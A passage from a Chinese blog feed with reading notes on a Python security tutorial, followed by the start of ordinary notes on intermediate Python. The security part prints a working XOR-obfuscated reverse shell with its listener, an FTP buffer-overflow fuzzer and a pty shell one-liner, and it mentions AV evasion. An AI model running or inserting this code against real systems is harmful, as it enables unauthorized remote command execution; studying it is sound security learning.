      <content:encoded><![CDATA[<p>已经地几本了，鼓励一下自己啦。这本主要是讲 <code>python</code> 用于安全相关的编程内容。本书的篇幅比较的短，这篇总结一下主要的内容。</p><hr><p>我们是愚者，我们是一只蜂 <code>1.6*10^9 &gt; 1.6*10^9</code> ，我们自己根据蓝图所画出的东西，超乎我们自己的想象。</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>书名：Python 安全编程教程</li><li>原文：<span class="exturl" data-url="aHR0cDovL3d3dy5wcmltYWxzZWN1cml0eS5uZXQvdHV0b3JpYWxzL3B5dGhvbi10dXRvcmlhbHMv" title="http://www.primalsecurity.net/tutorials/python-tutorials/">Python Tutorials<i class="fa fa-external-link"></i></span></li><li>译者：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NtYXJ0Rmxhc2g=" title="https://github.com/smartFlash">smartFlash<i class="fa fa-external-link"></i></span></li><li>来源：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NtYXJ0Rmxhc2gvcHlTZWN1cml0eQ==" title="https://github.com/smartFlash/pySecurity">pySecurity<i class="fa fa-external-link"></i></span></li><li>协议：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NtYXJ0Rmxhc2gvcHlTZWN1cml0eS9ibG9iL21hc3Rlci9MSUNFTlNF" title="https://github.com/smartFlash/pySecurity/blob/master/LICENSE">MIT License<i class="fa fa-external-link"></i></span> </li></ul><hr><p>这是一本技术类书籍，主要内容是 Python 相关的安全类的书。</p><h2 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h2><ul><li>使用 <code>help</code> 函数，可以很方便的查看函数的相关说明</li></ul><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>简单的端口扫描功能，使用 socket 进行连接的建立，如果连接失败，代表端口未开放。这个效率当然是比较低的。一般是只是用 <code>SYN</code> 得到 <code>ACK</code> 之后就直接结束会话。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> range(<span class="number">20</span>,<span class="number">25</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[+] Attempting to connect to 127.0.0.1:"</span>+str(port)</span><br><span class="line">        s.connect((<span class="string">'127.0.0.1'</span>, port))</span><br><span class="line">        s.send(<span class="string">'Primal Security \n'</span>)    </span><br><span class="line">        banner = s.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">if</span> banner:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"[+] Port "</span>+str(port)+<span class="string">" open: "</span>+banner</span><br><span class="line">        s.close()</span><br><span class="line">    <span class="keyword">except</span>: <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>书中的示例代码如上：上面对于未打开端口，捕获其异常。不做任何操作。在循环中轮询端口，建立连接，</p><h2 id="反向Shell"><a href="#反向Shell" class="headerlink" title="反向Shell"></a>反向Shell</h2><p>Shell 是个耳熟的，分两个类型，<code>正向Shell</code> 与 <code>反向Shell</code>。 分别为 <strong>reverse</strong> 和 <strong>bind</strong> 。正向shell 可以理解为，客户端打开了一个端口，我们组主动连接客户端。 反向shell 指的是，我们本地打开端口，让受控的客户端去连接我们。</p><hr><p>具体的代码，书中已经给出了，内容简单易读，这里加上些注释吧：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket,subprocess,sys</span><br><span class="line"></span><br><span class="line">RHOST = sys.argv[<span class="number">1</span>]</span><br><span class="line">RPORT = <span class="number">443</span></span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((RHOST, RPORT))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">     <span class="comment"># 从socket中接收XOR编码的数据 &lt; 这里学着点，使用了简单的异或加密。</span></span><br><span class="line">     data = s.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">     <span class="comment"># XOR the data again with a '\x41' to get back to normal data</span></span><br><span class="line">     en_data = bytearray(data)</span><br><span class="line">     <span class="keyword">for</span> i <span class="keyword">in</span> range(len(en_data)):</span><br><span class="line">       en_data[i] ^=<span class="number">0x41</span><span class="comment"># 异或操作</span></span><br><span class="line"></span><br><span class="line">     <span class="comment"># 执行解码命令，subprocess模块能够通过PIPE STDOUT/STDERR/STDIN把值赋值给一个变量</span></span><br><span class="line">     comm = subprocess.Popen(str(en_data), shell=<span class="keyword">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)</span><br><span class="line">     STDOUT, STDERR = comm.communicate()</span><br><span class="line"></span><br><span class="line">     <span class="comment"># 输出编码后的数据并且发送给指定的主机RHOST</span></span><br><span class="line">     en_STDOUT = bytearray(STDOUT)</span><br><span class="line">     <span class="keyword">for</span> i <span class="keyword">in</span> range(len(en_STDOUT)):</span><br><span class="line">       en_STDOUT[i] ^=<span class="number">0x41</span></span><br><span class="line">     s.send(en_STDOUT)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><hr><p>上面的代码其实是很简单的。建立连接之后，对我们的的远程的传入命令进行执行。这里一个 point 是: <code>subprocess</code> 的模块的使用。</p><p><code>subprocess</code> 和 <code>os.system</code> 不同，前者可以把输出进行向变量的重定向。可以得到命令执行吼的完整的回显。然而如果使用 后者 ，只会得到 其进程 <strong>返回值</strong>， 值得注意的是，system 的返回值是 linux 的标准的左移 <strong>8位</strong> 后的值。</p><hr><p><strong>发送部分</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket </span><br><span class="line"></span><br><span class="line">s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.bind((<span class="string">"0.0.0.0"</span>, <span class="number">443</span>))</span><br><span class="line">s.listen(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Listening on port 443... "</span></span><br><span class="line">(client, (ip, port)) = s.accept()</span><br><span class="line"><span class="keyword">print</span> <span class="string">" Received connection from : "</span>, ip</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    command = raw_input(<span class="string">'~$ '</span>)<span class="comment"># 等待输入和打印提示符</span></span><br><span class="line">    encode = bytearray(command)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(encode)):</span><br><span class="line">        encode[i] ^=<span class="number">0x41</span></span><br><span class="line">    client.send(encode)</span><br><span class="line">    en_data=client.recv(<span class="number">2048</span>)</span><br><span class="line">    decode = bytearray(en_data)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(decode)):</span><br><span class="line">        decode[i] ^=<span class="number">0x41</span></span><br><span class="line">        <span class="comment"># 解码并且进行打印。</span></span><br><span class="line">    <span class="keyword">print</span> decode</span><br><span class="line"></span><br><span class="line">client.close()</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><h2 id="模糊测试-（fuzzing）"><a href="#模糊测试-（fuzzing）" class="headerlink" title="模糊测试 （fuzzing）"></a>模糊测试 （fuzzing）</h2><blockquote><p>模糊测试 是一种软件测试技术。其核心思想是自动或半自动的生成随机数据输入到一个程序中，并监视程序异常，如崩溃，断言失败，以发现可能的程序错误，比如内存泄漏。</p></blockquote><p>基于 python 实现的模糊测试的脚本。具体思想，就是提交大量的随机模拟输入，来发现系统的潜在的问题。实现思想就是，模拟用户提交，发现问题之后进行上报。书中的代码如下，一样是是自己去添加一些注释</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, socket</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">target = sys.argv[<span class="number">1</span>]</span><br><span class="line">buff = <span class="string">'\x41'</span>*<span class="number">50</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">  <span class="comment">#使用"try - except"处理错误与动作</span></span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 连接这目标主机的ftp端口 21</span></span><br><span class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    s.settimeout(<span class="number">2</span>)</span><br><span class="line">    s.connect((target,<span class="number">21</span>))</span><br><span class="line">    s.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Sending buffer with length: "</span>+str(len(buff))</span><br><span class="line">    <span class="comment">#发送字符串:USER并且带有测试的用户名</span></span><br><span class="line">    s.send(<span class="string">"USER "</span>+buff+<span class="string">"\r\n"</span>)</span><br><span class="line">    s.close()</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#使用循环来递增直至长度为50</span></span><br><span class="line">    buff = buff + <span class="string">'\x41'</span>*<span class="number">50</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">except</span>: <span class="comment"># 如果连接服务器失败，我们就打印出下面的结果</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[+] Crash occured with buffer length: "</span>+str(len(buff)<span class="number">-50</span>)</span><br><span class="line">    sys.exit()</span><br></pre></td></tr></table></figure><p>emmm  这个其实也是没啥好注释的了，内容简单明了，算是点开了一种妙用。</p><h2 id="内容压缩"><a href="#内容压缩" class="headerlink" title="内容压缩"></a>内容压缩</h2><ul><li><strong>py2exe</strong>     把python 文件打包成一个 exe 进行发布</li><li><strong>Web 请求及解析</strong>  Beautiful Soup和urllib/urllib2</li><li><strong>爬虫</strong> <span class="exturl" data-url="aHR0cHM6Ly9weXBpLnB5dGhvbi5vcmcvcHlwaS9zcGlkZXIucHkv" title="https://pypi.python.org/pypi/spider.py/">spider模块<i class="fa fa-external-link"></i></span> 有现成的模块可以用啦 <code>from spider import webspider as myspider</code></li><li><strong>Whois自动查询</strong> <span class="exturl" data-url="aHR0cHM6Ly9weXBpLnB5dGhvbi5vcmcvcHlwaS9jeW1ydXdob2lzLzEuMA==" title="https://pypi.python.org/pypi/cymruwhois/1.0">Whois 模块<i class="fa fa-external-link"></i></span></li><li><p><strong>Python 与 Metasploit</strong></p></li><li><p><strong>虚拟终端</strong>  和 反向shell 不同，终端是用于直接打开一个 终端程序 <code>python -c &quot;import pty;pty.spawn(&quot;/bin/bash&quot;)&quot;</code></p></li><li><p><strong><span class="exturl" data-url="aHR0cHM6Ly93aXphcmRmb3JjZWwuZ2l0Ym9va3MuaW8vcHktc2VjLXR1dG9yaWFsL2NvbnRlbnQvemgtY24vMHhjLmh0bWw=" title="https://wizardforcel.gitbooks.io/py-sec-tutorial/content/zh-cn/0xc.html">基于 Python 的远控<i class="fa fa-external-link"></i></span></strong> 这个东西虽然有 py2exe 感觉还是比较鸡肋吧，实现了添加注册表自启动，和弹shell的功能，不过有时候 之前用的 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1ZlaWwtRnJhbWV3b3JrL1ZlaWw=" title="https://github.com/Veil-Framework/Veil">veil<i class="fa fa-external-link"></i></span> 也是使用的 python 做的免杀。</p></li></ul><h2 id="EXP的编写"><a href="#EXP的编写" class="headerlink" title="EXP的编写"></a>EXP的编写</h2><p>这里书中列出了几个简易的 EXP 的脚本，是一件被挖掘的 RCE （远程代码执行）， 和 LFI （本地文件包含） 的漏洞。实现的是 poc 的改变实现的功能，漏洞本身原理，还是有待挖掘的。这里就简单的先列出来吧，做个小表格，对漏洞有个基础的了解。</p><table><thead><tr><th>CVE</th><th style="text-align:left">类型</th></tr></thead><tbody><tr><td><span class="exturl" data-url="aHR0cHM6Ly93aXphcmRmb3JjZWwuZ2l0Ym9va3MuaW8vcHktc2VjLXR1dG9yaWFsL2NvbnRlbnQvemgtY24vMHgxMy5odG1s" title="https://wizardforcel.gitbooks.io/py-sec-tutorial/content/zh-cn/0x13.html">CVE-2014-6271<i class="fa fa-external-link"></i></span></td><td style="text-align:left">bash 远程代码执行</td></tr><tr><td><span class="exturl" data-url="aHR0cHM6Ly93aXphcmRmb3JjZWwuZ2l0Ym9va3MuaW8vcHktc2VjLXR1dG9yaWFsL2NvbnRlbnQvemgtY24vMHgxNC5odG1s" title="https://wizardforcel.gitbooks.io/py-sec-tutorial/content/zh-cn/0x14.html">CVE-2012-1823<i class="fa fa-external-link"></i></span></td><td style="text-align:left">php-cgi 远程代码执行</td></tr><tr><td><span class="exturl" data-url="aHR0cHM6Ly93aXphcmRmb3JjZWwuZ2l0Ym9va3MuaW8vcHktc2VjLXR1dG9yaWFsL2NvbnRlbnQvemgtY24vMHgxNi5odG1s" title="https://wizardforcel.gitbooks.io/py-sec-tutorial/content/zh-cn/0x16.html">CVE-2014-3704<i class="fa fa-external-link"></i></span></td><td style="text-align:left">SQL 注入</td></tr><tr><td><span class="exturl" data-url="aHR0cHM6Ly93aXphcmRmb3JjZWwuZ2l0Ym9va3MuaW8vcHktc2VjLXR1dG9yaWFsL2NvbnRlbnQvemgtY24vMHgxNS5odG1s" title="https://wizardforcel.gitbooks.io/py-sec-tutorial/content/zh-cn/0x15.html">CVE-2012-3152<i class="fa fa-external-link"></i></span></td><td style="text-align:left">Oracle本地文件包含</td></tr></tbody></table>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/10/29/Book_Python%E5%AE%89%E5%85%A8%E7%BC%96%E7%A8%8B/#disqus_thread</comments>
    </item>
    
    <item>
      <title>读本好书 《Python 进阶》</title>
      <link>https://www.diglp.xyz/2018/10/28/Book_interpy/</link>
      <guid>https://www.diglp.xyz/2018/10/28/Book_interpy/</guid>
      <pubDate>Sat, 27 Oct 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot;
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>坚持自己的读书计划吧，不断地学习新知识和历练自己的能力水平。来填充自己平时的空白，的确是一件很舒服的事情不是吗。</p><p>没必要去羡慕，静下心来做好自己的东西就好了。很多东西一旦拥有了，也许就不会珍惜了，得不到的永远在骚动，被偏爱的却有恃无恐。</p><hr><p>平时总是有很多想法，偶尔的写写 XD。这次的书，篇幅很短，所以也很顺利的在一周之内读的差不多了。正值周末，来写写笔记，和一些使用的demo 。不然就忘得差不多了。</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>书名：Intermediate Python</li><li>作者：yassoob</li><li>ISBN：N/A</li><li>开源书籍</li></ul><p>本书是一本开源书籍，开源的精神真的感染了我们每个人，我写书，大家来翻译，来排版，来查错。大家都是自愿的一起去实现同一个目标，就算功底不行，提个 issue 也好呢。</p><blockquote><p>感谢英文原著作者 @yasoob《<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3lhc29vYi9pbnRlcm1lZGlhdGVQeXRob24=" title="https://github.com/yasoob/intermediatePython">Intermediate Python<i class="fa fa-external-link"></i></span>》，有了他才有了这里的一切</p><p>中译版 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Vhc3RsYWtlc2lkZS9pbnRlcnB5LXpo" title="https://github.com/eastlakeside/interpy-zh">Python 进阶<i class="fa fa-external-link"></i></span></p></blockquote><hr><p>这是一本技术类书籍，介绍了很多 python 的较为进阶的语法和使用指南， 这里就直接做个总结吧。</p><h2 id="args-和-kwargs"><a href="#args-和-kwargs" class="headerlink" title="args 和 *kwargs"></a><em>args 和 *</em>kwargs</h2><p><code>*args</code> 和 <code>**kwargs</code>  实现了函数里面的不定参数。比如 python 里面的 <code>print()</code>函数。我们就一次性打印多个参数。比如以下实例代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">args</span><span class="params">(*argvs)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> argvs:</span><br><span class="line">        print(i)</span><br><span class="line">        </span><br><span class="line">args(<span class="string">'1'</span>,<span class="number">2</span>,<span class="string">'test'</span>)</span><br></pre></td></tr></table></figure><p>可见，实际上我们的多个参数使用 <code>*args</code> 在进入函数之后，会被组装成一个 <code>tuple</code> 元组。我们可以对其进行迭代。</p><p><strong>值得注意的</strong>是 <code>*args</code> 并不是固定的，这个只是默认的约定，如上述代码里面的 argvs 一样的是可以成功运行。</p><hr><p><code>**kwargs</code> 这个名字看起来不含辨识，实际上如其功能，这个是传递的是不定长度的键值对 <strong>key-value</strong>，KV ≈ KW ？</p><p>问：dict 字典本身不就是不定长度的吗？ 一样可以直接作为参数传入，</p><p>答：看示例代码的形式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">args</span><span class="params">(**kwargs)</span>:</span></span><br><span class="line">print(kwargs.key())</span><br><span class="line">print(kwargs.values())</span><br><span class="line"></span><br><span class="line">args(a=<span class="number">123</span>, b=<span class="number">456</span>, c=<span class="number">789</span>)</span><br></pre></td></tr></table></figure><p>这个传入的形式是不是相当的眼熟，没错，我们的pymysql 里面的进行连接的函数一样的使用的是这种形式。所以对于我们的启发是。</p><p>python的函数可以同时使用 常规参数，和这种可变长字典的形式，这样可以用于我们多出的参数， 也增加了程序的鲁棒性。</p><hr><p>如果同时的去使用 这两种形式，其顺序如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">some_func(fargs, *args, **kwargs)</span><br></pre></td></tr></table></figure><p>这里还有个很有趣的用法，叫做 <strong>猴子补丁(monkey patch)</strong> 指的是程序再起运行的时候进行动态的 hot patch。就像 Django 一样，可以动态的修改路由不必停止其整个进程。</p><h2 id="PDB"><a href="#PDB" class="headerlink" title="PDB"></a>PDB</h2><p>PDB 可以实现对 py 文件进行简单的调试：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m pdb my_script.py</span><br></pre></td></tr></table></figure><h5 id="命令列表："><a href="#命令列表：" class="headerlink" title="命令列表："></a>命令列表：</h5><ul><li><code>c</code>: 继续执行</li><li><code>w</code>: 显示当前正在执行的代码行的上下文信息</li><li><code>a</code>: 打印当前函数的参数列表</li><li><code>s</code>: 执行当前代码行，并停在第一个能停的地方（相当于单步进入）</li><li><code>n</code>: 继续执行到当前函数的下一行，或者当前行直接返回（单步跳过）</li></ul><h2 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h2><p>生成器，可以抽象成一个 函数，输入有对应的输出。生成我们的结构，而不一个大大的列表，用来存内容，显得 太不 pythonic。</p><blockquote><p>迭代器是一个让程序员可以遍历一个容器（特别是列表）的对象。</p></blockquote><p>这里书里有的三个概念：</p><ul><li>可迭代对象(Iterable)    比如列表，他是可迭代的</li><li>迭代器(Iterator)        用于迭代可迭代容器的一个对象</li><li>迭代(Iteration)        遍历课迭代对象的过程</li></ul><hr><blockquote><p>Python中任意的对象，只要它定义了可以返回一个迭代器的<code>__iter__</code>方法，或者定义了可以支持下标索引的<code>__getitem__</code>方法(这些双下划线方法会在其他章节中全面解释)，那么它就是一个可迭代对象。</p></blockquote><p>这个也就解释了，当一个错误的类型被使用 <code>[1]</code> 进行索引报错的，是没有<code>__getitem__</code> 这个方法。</p><blockquote><p>任意对象，只要定义了<code>next</code>(Python2) 或者<code>__next__</code>方法，它就是一个迭代器。就这么简单。现在我们来理解迭代(iteration)</p></blockquote><p>这个 对象可以使用 next ，对容器的下一个继续迭代。</p><p>（这里大面积引用，因为地区是很简明扼要的。）</p><hr><p>正如之前说，生成器是可以看作一个函数，每次都是有一个输出，而不是大量的一堆的数据。下面的代码便是实现了一个生成器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generator_function</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line"><span class="keyword">yield</span> i</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> generator_function():</span><br><span class="line">print(i)</span><br></pre></td></tr></table></figure><p>有了这样的方法，我们定义的生成器是迭代的，最大的好处，是我们不必一次性的生成大量的数据。like：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mass</span><span class="params">(n)</span>:</span></span><br><span class="line">a = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range():</span><br><span class="line">a.append(i*i)</span><br><span class="line"><span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> mass(<span class="number">100</span>):</span><br><span class="line">print(i)</span><br></pre></td></tr></table></figure><p>这样的方法我们生成大量的数据的时候，会占据大量的数据缓冲，十分的不 pythonic，所以换个写法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mass</span><span class="params">(n)</span>:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line"><span class="keyword">yield</span> i*i</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> mass(<span class="number">100</span>):</span><br><span class="line">print(i)</span><br></pre></td></tr></table></figure><p>这种写法，实现了一个迭代器，使用 for 结构，对其进行迭代。可是，其实际上的过程呢，看这里:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print(type(mass))</span><br><span class="line">print(type(mass(<span class="number">10</span>)))</span><br><span class="line">print(next(mass(<span class="number">10</span>)))</span><br></pre></td></tr></table></figure><p>可见构造的生成器函数在初始化之后成为了一个生成器，且其为一个课迭代对象，可以使用next 进行迭代。</p><hr><p>迭代器，前面提到是可以对可迭代容器进行迭代的对象。我们常见的 <code>str</code> 本身是一个可迭代对象，但是不是迭代器。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mStr = <span class="string">"hello"</span></span><br><span class="line">str_iter = iter(mStr)</span><br><span class="line">print(next(str_iter))</span><br></pre></td></tr></table></figure><p>这样，就完成了一个迭代器的初始化，以及进行了迭代器的操作 。</p><h2 id="Map，Filter，Reduce"><a href="#Map，Filter，Reduce" class="headerlink" title="Map，Filter，Reduce"></a>Map，Filter，Reduce</h2><p>这几个东西，就是相当的 pythonic 了，实现对可迭代数据的批量操作。用的好的话，程序是十分优雅的~。</p><p>经常会有这样的代码，真的是蠢蠢的格式，和行为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line">x = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">x.append(a[i]**<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>那么怎么办呢， 这里就出现了 map 函数，实际上这函数在 JS 里面也是有的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line">x = list(map(<span class="keyword">lambda</span> x: x**<span class="number">2</span>, a))</span><br></pre></td></tr></table></figure><p>这样的简单的一句，就实现了对于整个数数组的批量操作，非常的优雅不是吗~。里面的 <code>lambda</code> 称之为 匿名函数，是个函数，但是没有吗名字，多用于临时的使用的函数，或者简单的单行函数。<strong>当然我们可以给他个名字</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line">pow = <span class="keyword">lambda</span> x: x**<span class="number">2</span></span><br><span class="line">x = list(map(pow, a))</span><br></pre></td></tr></table></figure><hr><p>这里还有个很厉害的操作，这里的 map 批量操作的对象甚至是可以是一个 函数的列表。比如实现，对一个列表的数据，进行多个不同的操作，并且可以容易的进行对比：操作如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">multiply</span><span class="params">(x)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (x*x)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(x)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (x+x)</span><br><span class="line"></span><br><span class="line">funcs = [multiply, add]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    value = map(<span class="keyword">lambda</span> x: x(i), funcs)</span><br><span class="line">    print(list(value))</span><br></pre></td></tr></table></figure><hr><p><code>filter</code> 正如其名，对数据进行过滤，再也不需要一个for 遍历之后，再 append 一个新的数组出来了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = range(<span class="number">0</span>,<span class="number">100</span>)</span><br><span class="line">b = filter(<span class="keyword">lambda</span> x:(x+<span class="number">1</span>)% <span class="number">2</span> == <span class="number">0</span>, a)</span><br><span class="line">print(b)</span><br></pre></td></tr></table></figure><p>完美优雅的筛选出了0~99 直接的所有的奇数；</p><hr><p>reduce 用于对一个可迭代对象内部的元素进行批量操作。比如列表求和，直到 求方方差之类的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mids = map(<span class="keyword">lambda</span> x: x.replace(<span class="string">'\n'</span>, <span class="string">''</span>), list(s))</span><br><span class="line">mids = set(mids)    <span class="comment"># 直接转集合去重</span></span><br><span class="line">h5_list_1 = reduce(<span class="keyword">lambda</span> x,y: x + <span class="string">'&lt;option value="'</span> + y +<span 